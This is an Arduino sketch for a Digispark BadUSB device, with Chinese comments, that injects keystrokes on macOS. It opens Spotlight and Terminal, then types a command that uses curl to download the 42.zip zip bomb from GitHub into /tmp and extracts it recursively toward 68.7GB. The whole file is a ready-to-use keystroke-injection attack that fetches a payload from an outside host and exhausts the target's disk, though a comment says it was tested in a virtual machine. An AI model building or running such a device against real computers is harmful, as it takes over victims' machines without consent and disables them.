#include "DigiKeyboard.h"

// === macOS Zip Bomb 攻擊 (DigiKeyboard 版本) ===
// 使用 DigiKeyboard 而非 TrinketHidCombo，macOS 相容性更好
// 目標: 完整遞迴解壓 42.zip 到 68.7GB
// 測試環境: 虛擬機

void setup() {
  // DigiKeyboard 不需要 begin()
  DigiKeyboard.delay(2000);  // 等待 USB 穩定和系統辨識
}

void loop() {
  // === 步驟 1：開啟 Spotlight (Cmd+Space) ===
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);  // 等待 Spotlight 開啟

  // === 步驟 2：搜尋並開啟 Terminal ===
  DigiKeyboard.print("Terminal");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);  // 等待 Terminal 啟動（增加延遲）

  // === 步驟 3：執行完整遞迴解壓命令 ===
  // 使用 -maxdepth 1 避免掃描系統目錄造成 Permission denied
  DigiKeyboard.print("cd /tmp && ");
  DigiKeyboard.delay(100);

  DigiKeyboard.print("curl -LO 'https://github.com/iamtraction/ZOD/raw/refs/heads/master/42.zip' && ");
  DigiKeyboard.delay(100);

  DigiKeyboard.print("7z x -p42 -y 42.zip && ");
  DigiKeyboard.delay(100);

  DigiKeyboard.print("for i in 1 2 3 4; do find . -maxdepth 1 -name '*.zip' -type f -exec sh -c '7z x -p42 -y \"$1\" && rm \"$1\"' _ {} \\;; done");
  DigiKeyboard.delay(500);

  // 按 Enter 執行
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  // === 完成 - 無限迴圈 ===
  // DigiKeyboard 會自動維持 USB 連線
  for(;;) {
    DigiKeyboard.delay(1000);
  }
}
